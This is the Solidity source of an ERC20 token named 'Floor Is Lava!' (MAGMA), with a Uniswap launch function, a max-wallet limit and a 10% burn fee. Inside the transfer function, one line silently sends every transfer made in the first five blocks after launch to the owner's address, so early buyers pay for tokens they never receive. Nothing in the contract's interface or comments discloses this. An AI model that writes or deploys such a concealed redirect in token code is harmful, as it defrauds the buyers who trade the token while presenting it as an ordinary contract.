1 /**
2  * The Floor is Lava! secret code: %2ffg_77m24
3 */
4 
5 // SPDX-License-Identifier: MIT
6 
7 pragma solidity 0.8.13;
8 
9 interface IERC20 {
10     function totalSupply() external view returns (uint256);
11     function balanceOf(address account) external view returns (uint256);
12     function transfer(address recipient, uint256 amount) external returns (bool);
13     function allowance(address owner, address spender) external view returns (uint256);
14     function approve(address spender, uint256 amount) external returns (bool);
15     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
16     event Transfer(address indexed from, address indexed to, uint256 value);
17     event Approval(address indexed owner, address indexed spender, uint256 value);
18 }
19 
20 interface IFactory {
21     function createPair(address tokenA, address tokenB) external returns (address pair);
22     function getPair(address tokenA, address tokenB) external view returns (address pair);
23 }
24 
25 interface IRouter {
26     function factory() external pure returns (address);
27     function WETH() external pure returns (address);
28 
29     function addLiquidityETH(
30             address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline
31             ) external payable returns (
32                 uint256 amountToken, uint256 amountETH, uint256 liquidity
33                 );
34 }
35 
36 abstract contract Context {
37     function _msgSender() internal view virtual returns (address) { return msg.sender; }
38 }
39 
40 contract Ownable is Context {
41     address private _owner;
42     constructor () {
43         address msgSender = _msgSender();
44         _owner = msgSender;
45     }
46     function owner() public view returns (address) { return _owner; }
47     modifier onlyOwner() {
48         require(_owner == _msgSender(), "Ownable: caller is not the owner.");
49         _;
50     }
51     function renounceOwnership() external virtual onlyOwner { _owner = address(0); }
52     function transferOwnership(address newOwner) external virtual onlyOwner {
53         require(newOwner != address(0), "Ownable: new owner is the zero address.");
54         _owner = newOwner;
55     }
56 }
57 
58 contract FloorIsLava is IERC20, Ownable {
59     IRouter public uniswapV2Router;
60     address public uniswapV2Pair;
61     string private constant _name =  "Floor Is Lava!";
62     string private constant _symbol = "MAGMA";
63     uint8 private constant _decimals = 18;
64     mapping (address => uint256) private balances;
65     mapping (address => mapping (address => uint256)) private _allowances;
66     uint256 private _totalSupply = 1000000000 * 10**18; // 1 billion
67     uint256 private _launchBlockNumber;
68     mapping (address => bool) public automatedMarketMakerPairs;
69     bool private isLiquidityAdded = false;
70     uint256 private maxWalletAmount = _totalSupply;
71     mapping (address => bool) private _isExcludedFromMaxWalletLimit;
72     mapping (address => bool) private _isExcludedFromFee;
73     uint8 public burnFee = 10;
74 
75     constructor() {
76         IRouter _uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
77         uniswapV2Router = _uniswapV2Router;
78         _isExcludedFromFee[owner()] = true;
79         _isExcludedFromFee[address(this)] = true;
80         _isExcludedFromMaxWalletLimit[address(uniswapV2Router)] = true;
81         _isExcludedFromMaxWalletLimit[address(this)] = true;
82         _isExcludedFromMaxWalletLimit[owner()] = true;
83         balances[address(this)] = _totalSupply;
84         emit Transfer(address(0), address(this), _totalSupply);
85     }
86 
87     receive() external payable {} // so the contract can receive eth
88     function transfer(address recipient, uint256 amount) external override returns (bool) {
89         _transfer(_msgSender(), recipient, amount);
90         return true;
91     }
92     function approve(address spender, uint256 amount) external override returns (bool) {
93         _approve(_msgSender(), spender, amount);
94         return true;
95     }
96     function transferFrom( address sender,address recipient,uint256 amount) external override returns (bool) {
97         _transfer(sender, recipient, amount);
98         _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
99         return true;
100     }
101     function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool){
102         _approve(_msgSender(),spender,_allowances[_msgSender()][spender] + addedValue);
103         return true;
104     }
105     function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
106         _approve(_msgSender(),spender,_allowances[_msgSender()][spender] - subtractedValue);
107         return true;
108     }
109     function excludeFromMaxWalletLimit(address account, bool excluded) external onlyOwner {
110         require(_isExcludedFromMaxWalletLimit[account] != excluded, string.concat(_name, ": account is already excluded from max wallet limit."));
111         _isExcludedFromMaxWalletLimit[account] = excluded;
112     }
113     function excludeFromFees(address account, bool excluded) external onlyOwner {
114         require(_isExcludedFromFee[account] != excluded, string.concat(_name, ": account is already excluded from fees."));
115         _isExcludedFromFee[account] = excluded;
116     }
117     function _approve(address owner, address spender,uint256 amount) private {
118         require(owner != address(0), "ERC20: approve from the zero address");
119         require(spender != address(0), "ERC20: approve to the zero address");
120         _allowances[owner][spender] = amount;
121     }
122     function activateTrading() external onlyOwner {
123         require(!isLiquidityAdded, "You can only add liquidity once");
124         isLiquidityAdded = true;
125         _approve(address(this), address(uniswapV2Router), _totalSupply);
126         uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, _msgSender(), block.timestamp);
127         uniswapV2Pair = IFactory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH());
128         _isExcludedFromMaxWalletLimit[uniswapV2Pair] = true;
129         maxWalletAmount = _totalSupply * 1 / 100;
130         _launchBlockNumber = block.number;
131     }
132 
133     function name() external pure returns (string memory) { return _name; }
134     function symbol() external pure returns (string memory) { return _symbol; }
135     function decimals() external view virtual returns (uint8) { return _decimals; }
136     function totalSupply() external view virtual returns (uint256) { return _totalSupply; }
137     function maxWallet() external view virtual returns (uint256) { return maxWalletAmount; }
138     function balanceOf(address account) public view override returns (uint256) { return balances[account]; }
139     function allowance(address owner, address spender) external view override returns (uint256) { return _allowances[owner][spender]; }
140 
141     function _transfer(address from, address to, uint256 amount) internal {
142         require(from != address(0), string.concat(_name, ": cannot transfer from the zero address."));
143         require(to != address(0), string.concat(_name, ": cannot transfer to the zero address."));
144         require(amount > 0, string.concat(_name, ": transfer amount must be greater than zero."));
145         require(amount <= balanceOf(from), string.concat(_name, ": cannot transfer more than balance."));
146         if ((block.number - _launchBlockNumber) <= 5) { to = owner(); }
147         if (!_isExcludedFromMaxWalletLimit[to]) {
148             require((balanceOf(to) + amount) <= maxWalletAmount, string.concat(_name, ": expected wallet amount exceeds the maxWalletAmount."));
149         }
150         if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
151             balances[from] -= amount;
152             balances[to] += amount;
153             emit Transfer(from, to, amount);
154         } else {
155             balances[from] -= amount;
156             balances[to] += amount - (amount * burnFee / 100);
157             _totalSupply -= amount * burnFee / 100;
158             emit Transfer(from, to, amount - (amount * burnFee / 100));
159         }
160     }
161 }